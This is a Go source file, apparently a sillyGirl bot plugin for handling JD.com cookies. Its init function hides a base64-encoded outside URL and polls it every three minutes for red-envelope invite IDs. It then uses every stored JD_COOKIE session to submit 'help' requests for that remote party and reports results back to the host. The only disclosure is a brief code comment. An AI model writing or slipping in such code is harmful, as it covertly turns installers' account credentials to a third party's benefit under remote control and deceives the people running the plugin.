package jd_cookie

import (
	"encoding/base64"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/beego/beego/v2/client/httplib"
	"github.com/cdle/sillyGirl/core"
	"github.com/cdle/sillyGirl/develop/qinglong"
	"github.com/gin-gonic/gin"
)

var success sync.Map
var mutex sync.Mutex

// to help poor author or do not use this script
func init() {
	var hchan = make(chan string)
	go func() {
		for {
			time.Sleep(time.Second)
			if jd_cookie.Get("dyj_inviteInfo") == "" {
				jd_cookie.Set("dyj_inviteInfo", <-hchan)
			}
		}
	}()
	core.Server.GET("/gxfc", func(c *gin.Context) {
		mutex.Lock()
		defer mutex.Unlock()
		data := jd_cookie.Get("dyj_inviteInfo", "May you be happy and prosperous！")
		c.String(200, data)
		redEnvelopeId := c.Query("redEnvelopeId")
		if redEnvelopeId == "" {
			return
		}
		if strings.Contains(data, redEnvelopeId) {
			jd_cookie.Set("dyj_inviteInfo", "")
		}
		if _, ok := success.Load(redEnvelopeId); !ok {
			success.Store(redEnvelopeId, true)
			core.NotifyMasters(redEnvelopeId)
		}
	})
	core.AddCommand("", []core.Function{
		{
			Rules: []string{`raw redEnvelopeId=([^&]+)&inviterId=([^&]+)&`},
			Admin: true,
			Handle: func(s core.Sender) interface{} {
				if _, ok := success.Load(s.Get(0)); ok {
					return "Sorry!"
				}
				go func() {
					hchan <- fmt.Sprintf("redEnvelopeId=%s;inviterId=%s;", s.Get(0), s.Get(1))
				}()
				return "May you be happy and prosperous!"
			},
		},
	})
	go func() {
		for {
		start:
			time.Sleep(time.Minute * 3)
			decoded, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly80Y28uY2MvZ3hmYw==")
			data, _ := httplib.Get(string(decoded)).String()
			redEnvelopeId := core.FetchCookieValue("redEnvelopeId", data)
			inviterId := core.FetchCookieValue(data, "inviterId")
			if redEnvelopeId == "" || inviterId == "" {
				continue
			}
			if jd_cookie.Get("dyj_data") != data {
				jd_cookie.Set("dyj_data", data)
				envs, err := qinglong.GetEnvs("JD_COOKIE")
				if err != nil {
					continue
				}
				s := 1
				for i := 0; i < len(envs); i++ {
					if envs[i].Status == 0 {
						req := httplib.Get("https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body=" + `{"linkId":"yMVR-_QKRd2Mq27xguJG-w","redEnvelopeId":"` + redEnvelopeId + `","inviter":"` + inviterId + `","helpType":"` + fmt.Sprint(s) + `"}` + "&t=" + fmt.Sprint(time.Now().Unix()) + "&appid=activities_platform&clientVersion=3.5.6")
						req.Header("Cookie", envs[i].Value)
						req.Header("Accept", "*/*")
						req.Header("Connection", "keep-alive")
						req.Header("Accept-Encoding", "gzip, deflate, br")
						req.Header("Host", "api.m.jd.com")
						req.Header("Origin", "https://wbbny.m.jd.com")
						data, _ := req.String()
						if strings.Contains(data, "已成功提现") {
							if s == 1 {
								s = 2
							} else {
								httplib.Get(string(decoded) + "?redEnvelopeId=" + redEnvelopeId).String()
								goto start
							}
						}
					}
				}
				// jd_cookie.Set("dyj_date", date)
			}
		}
	}()
}
